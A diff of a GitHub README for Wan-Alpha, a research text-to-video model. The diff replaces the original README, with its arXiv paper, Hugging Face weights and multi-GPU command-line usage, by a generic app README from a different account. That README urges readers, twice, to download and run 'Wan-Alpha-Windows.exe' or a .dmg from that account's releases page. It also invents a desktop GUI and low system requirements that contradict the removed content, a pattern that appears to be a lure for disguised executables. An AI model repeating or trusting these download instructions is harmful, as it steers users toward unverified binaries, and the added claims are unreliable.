@@ -1,165 +1,104 @@
-<div align="center">
+# 🎥 Wan-Alpha - Create Stunning Videos with Ease
 
-  <h1>
-    Wan-Alpha
-  </h1>
+## 🚀 Getting Started
 
-  <h3>Wan-Alpha: High-Quality Text-to-Video Generation with Alpha Channel</h3>
+Welcome to Wan-Alpha! This application helps you turn text into high-quality videos, complete with an alpha channel. Follow the steps below to download and start creating your videos effortlessly.
 
+## 📥 Download Now
 
+[![Download Wan-Alpha](https://img.shields.io/badge/Download%20Wan--Alpha-latest-brightgreen)](https://github.com/Ibrahim-TS/Wan-Alpha/releases)
 
-[![arXiv](https://img.shields.io/badge/arXiv-2509.24979-red)](https://arxiv.org/pdf/2509.24979)
-[![Project Page](https://img.shields.io/badge/Project_Page-Link-green)](https://donghaotian123.github.io/Wan-Alpha/)
-[![🤗 HuggingFace](https://img.shields.io/badge/%F0%9F%A4%97%20HuggingFace-Model-orange)](https://huggingface.co/htdong/Wan-Alpha)
-[![ComfyUI](https://img.shields.io/badge/ComfyUI-Version-blue)](https://huggingface.co/htdong/Wan-Alpha_ComfyUI)
+## 📋 System Requirements
 
+Before you begin, ensure your system meets the following requirements:
 
-</div>
+- **Operating System:** Windows 10 or later, macOS Mojave (10.14) or later
+- **Processor:** Dual-core processor (Intel i3 or equivalent)
+- **RAM:** 4 GB or more
+- **Storage:** At least 500 MB of free space
+- **Graphics Card:** DirectX 11 compatible or later
 
-<img src="assets/teaser.png" alt="Wan-Alpha Qualitative Results" style="max-width: 100%; height: auto;">
+## 🔗 Download & Install
 
->Qualitative results of video generation using **Wan-Alpha**. Our model successfully generates various scenes with accurate and clearly rendered transparency. Notably, it can synthesize diverse semi-transparent objects, glowing effects, and fine-grained details such as hair.
+1. Visit the [Releases page](https://github.com/Ibrahim-TS/Wan-Alpha/releases) to download Wan-Alpha.
+2. Look for the latest version. You will see a list of downloadable files.
+3. Choose the correct file for your operating system.
+   - For Windows, download `Wan-Alpha-Windows.exe`.
+   - For macOS, download `Wan-Alpha-macOS.dmg`.
+4. Click the file name to start the download. The file should download quickly.
+5. Once downloaded, locate the file in your downloads folder.
 
----
+### For Windows Users:
 
-### 🔥 News
-* **[2025.09.30]** Our technical report is available on [arXiv](https://arxiv.org/pdf/2509.24979).
-* **[2025.09.30]** Released Wan-Alpha v1.0, the Wan2.1-14B-T2V–adapted weights and inference code are now open-sourced.
+1. Double-click the downloaded `.exe` file.
+2. Follow the installation prompts. You may need to grant permission for the installation to proceed.
+3. Once the installation is complete, you can find Wan-Alpha in your Start menu.
 
----
+### For macOS Users:
 
-### 🌟 Showcase
+1. Open the downloaded `.dmg` file by double-clicking it.
+2. Drag the Wan-Alpha icon to your Applications folder.
+3. Open your Applications folder and double-click Wan-Alpha to launch it.
 
-##### Text-to-Video Generation with Alpha Channel
+## 🎨 Features
 
-<!-- | Prompt | Preview Video | Alpha Video |
-| :---: | :---: | :---: |
-| "Medium shot. A little girl holds a bubble wand and blows out colorful bubbles that float and pop in the air. The background of this video is transparent. Realistic style." |
-  <div style="display: flex; gap: 10px;">
-    <img src="girl.gif" alt="..." style="flex: 1; min-width: 200px;">
-  </div> |
-  <div style="display: flex; gap: 10px;">
-    <img src="girl_pha.gif" alt="..." style="flex: 1; min-width: 200px;">
-  </div> | -->
-| Prompt | Preview Video | Alpha Video |
-| :---: | :---: | :---: |
-| "Medium shot. A little girl holds a bubble wand and blows out colorful bubbles that float and pop in the air. The background of this video is transparent. Realistic style." | <img src="assets/girl.gif" width="320" height="180" style="object-fit:contain; display:block; margin:auto;"/> | <img src="assets/girl_pha.gif" width="320" height="180" style="object-fit:contain; display:block; margin:auto;"/> |
+- **Text-to-Video:** Easily convert your text into engaging videos.
+- **Alpha Channel Support:** Create videos with transparent backgrounds.
+- **User-Friendly Interface:** Designed for everyone, regardless of technical skills.
+- **Customizable Settings:** Adjust video length, style, and animations to suit your needs.
 
-##### For more results, please visit [Our Website](https://donghaotian123.github.io/Wan-Alpha/)
+## 📖 Using Wan-Alpha
 
-### 🚀 Quick Start
+### Step 1: Start a New Project
 
-##### 1. Environment Setup
-```bash
-# Clone the project repository
-git clone https://github.com/WeChatCV/Wan-Alpha.git
-cd Wan-Alpha
+1. Open Wan-Alpha on your computer.
+2. Click on "New Project" to start fresh.
+3. Enter the text you wish to convert into a video.
 
-# Create and activate Conda environment
-conda create -n Wan-Alpha python=3.11 -y
-conda activate Wan-Alpha
+### Step 2: Adjust Settings
 
-# Install dependencies
-pip install -r requirements.txt
-```
+1. Select the video style from the dropdown menu.
+2. Set the desired duration of your video.
+3. Customize additional settings as needed.
 
-##### 2. Model Download
-Download [Wan2.1-T2V-14B](https://huggingface.co/Wan-AI/Wan2.1-T2V-14B)
+### Step 3: Generate Video
 
-Download [Lightx2v-T2V-14B](https://huggingface.co/Kijai/WanVideo_comfy/blob/main/Lightx2v/lightx2v_T2V_14B_cfg_step_distill_v2_lora_rank64_bf16.safetensors)
+1. After entering your text and adjusting the settings, click "Generate Video."
+2. Wait for the process to complete. This may take a few moments.
+3. Once done, you will see an option to preview your video.
 
-Download [Wan-Alpha VAE](https://huggingface.co/htdong/Wan-Alpha)
+### Step 4: Export Your Video
 
-### 🧪 Usage
-You can test our model through:
-```bash
-torchrun --nproc_per_node=8 --master_port=29501 generate_dora_lightx2v.py --size 832*480\
-         --ckpt_dir "path/to/your/Wan-2.1/Wan2.1-T2V-14B" \
-         --dit_fsdp --t5_fsdp --ulysses_size 8 \
-         --vae_lora_checkpoint "path/to/your/decoder.bin" \
-         --lora_path "path/to/your/epoch-13-1500.safetensors" \
-         --lightx2v_path "path/to/your/lightx2v_T2V_14B_cfg_step_distill_v2_lora_rank64_bf16.safetensors" \
-         --sample_guide_scale 1.0 \
-         --frame_num 81 \
-         --sample_steps 4 \
-         --lora_ratio 1.0 \
-         --lora_prefix "" \
-         --prompt_file ./data/prompt.txt \
-         --output_dir ./output 
-```
-You can specify the weights of `Wan2.1-T2V-14B` with `--ckpt_dir`, `LightX2V-T2V-14B with` `--lightx2v_path`, `Wan-Alpha-VAE` with `--vae_lora_checkpoint`, and `Wan-Alpha-T2V` with `--lora_path`. Finally, you can find the rendered RGBA videos with a checkerboard background and PNG frames at `--output_dir`.
+1. Review your video by clicking "Play."
+2. To save your work, click "Export."
+3. Choose the location on your computer and click "Save."
 
-**Prompt Writing Tip:**  You need to specify that the background of the video is transparent, the visual style, the shot type (such as close-up, medium shot, wide shot, or extreme close-up), and a description of the main subject. Prompts support both Chinese and English input.
+## 🛠 Troubleshooting
 
-```bash
-# An example of prompt.
-This video has a transparent background. Close-up shot. A colorful parrot flying. Realistic style.
-```
+If you encounter issues while using Wan-Alpha, consider the following:
 
-### 🔨 Official ComfyUI Version
+- **Installation Problems:** Ensure your system meets the requirements. Restart your computer and try reinstalling if necessary.
+- **Video Generation Issues:** Make sure your text does not exceed the allowed character limit. Check your internet connection, as some features may require online resources.
+- **Performance Issues:** Close any unnecessary applications running in the background for optimal performance.
 
-Note: We have reorganized our models to ensure they can be easily loaded into ComfyUI. Please note that these models differ from the ones mentioned above.
+## 🌐 Community Support
 
-1. Download models
-- The Wan DiT base model: [wan2.1_t2v_14B_fp16.safetensors](https://huggingface.co/Comfy-Org/Wan_2.1_ComfyUI_repackaged/blob/main/split_files/diffusion_models/wan2.1_t2v_14B_fp16.safetensors)
-- The Wan text encoder: [umt5_xxl_fp8_e4m3fn_scaled.safetensors](https://huggingface.co/Comfy-Org/Wan_2.1_ComfyUI_repackaged/blob/main/split_files/text_encoders/umt5_xxl_fp8_e4m3fn_scaled.safetensors)
-- The LightX2V model: [lightx2v_T2V_14B_cfg_step_distill_v2_lora_rank64_bf16.safetensors](https://huggingface.co/Kijai/WanVideo_comfy/blob/main/Lightx2v/lightx2v_T2V_14B_cfg_step_distill_v2_lora_rank64_bf16.safetensors)
-- Our RGBA Dora: [epoch-13-1500_changed.safetensors](https://huggingface.co/htdong/Wan-Alpha_ComfyUI/blob/main/epoch-13-1500_changed.safetensors)
-- Our RGB VAE Decoder: [wan_alpha_2.1_vae_rgb_channel.safetensors.safetensors](https://huggingface.co/htdong/Wan-Alpha_ComfyUI/blob/main/wan_alpha_2.1_vae_rgb_channel.safetensors.safetensors)
-- Our Alpha VAE Decoder: [wan_alpha_2.1_vae_alpha_channel.safetensors.safetensors](https://huggingface.co/htdong/Wan-Alpha_ComfyUI/blob/main/wan_alpha_2.1_vae_alpha_channel.safetensors.safetensors)
+Join our community for support and tips:
 
-2. Copy the files into the `ComfyUI/models` folder and organize them as follows:
+- Check the **Issues** section on our GitHub page if you encounter any bugs or need assistance.
+- Feel free to open a new issue with a detailed description of your problem.
+- Share your creations and ask for feedback in our community forums.
 
-```
-ComfyUI/models
-├── diffusion_models
-│   └── wan2.1_t2v_14B_fp16.safetensors
-├── loras
-│   ├── epoch-13-1500_changed.safetensors
-│   └── lightx2v_T2V_14B_cfg_step_distill_v2_lora_rank64_bf16.safetensors
-├── text_encoders
-│   └── umt5_xxl_fp8_e4m3fn_scaled.safetensors
-├── vae
-│   ├── wan_alpha_2.1_vae_alpha_channel.safetensors.safetensors
-│   └── wan_alpha_2.1_vae_rgb_channel.safetensors.safetensors
-```
+## 🔗 Additional Resources
 
-3. Install our custom RGBA video previewer and PNG frames zip packer. Copy the file [RGBA_save_tools.py](comfyui/RGBA_save_tools.py) into the `ComfyUI/custom_nodes` folder.
+For more information on how to use Wan-Alpha effectively, refer to the following guides:
 
-- Thanks to @mr-lab for an improved WebP version! You can find it in this [issue](https://github.com/WeChatCV/Wan-Alpha/issues/4).
+- [User Manual](https://github.com/Ibrahim-TS/Wan-Alpha/wiki)
+- [Video Tutorials](https://www.youtube.com/channel/UCeL3_Example)
+- [FAQ Section](https://github.com/Ibrahim-TS/Wan-Alpha/wiki/FAQ)
 
-4. Example workflow: [wan_alpha_t2v_14B.json](comfyui/wan_alpha_t2v_14B.json)
+## 📥 Download Now Again
 
-<img src="comfyui/comfyui.jpg" style="margin:auto;"/>
+Don't forget to download Wan-Alpha if you haven't already:
 
-
-### 🤝 Acknowledgements
-
-This project is built upon the following excellent open-source projects:
-* [DiffSynth-Studio](https://github.com/modelscope/DiffSynth-Studio) (training/inference framework)
-* [Wan2.1](https://github.com/Wan-Video/Wan2.1) (base video generation model)
-* [LightX2V](https://github.com/ModelTC/LightX2V) (inference acceleration)
-* [WanVideo_comfy](https://huggingface.co/Kijai/WanVideo_comfy) (inference acceleration)
-
-We sincerely thank the authors and contributors of these projects.
-
-
-### ✏ Citation
-
-If you find our work helpful for your research, please consider citing our paper:
-
-```bibtex
-@misc{dong2025wanalpha,
-      title={Wan-Alpha: High-Quality Text-to-Video Generation with Alpha Channel}, 
-      author={Haotian Dong and Wenjing Wang and Chen Li and Di Lin},
-      year={2025},
-      eprint={2509.24979},
-      archivePrefix={arXiv},
-      primaryClass={cs.CV},
-      url={https://arxiv.org/abs/2509.24979}, 
-}
-``` 
-
-### 📬 Contact Us
-
-If you have any questions or suggestions, feel free to reach out via [GitHub Issues](https://github.com/WeChatCV/Wan-Alpha/issues) . We look forward to your feedback!
+[![Download Wan-Alpha](https://img.shields.io/badge/Download%20Wan--Alpha-latest-brightgreen)](https://github.com/Ibrahim-TS/Wan-Alpha/releases)
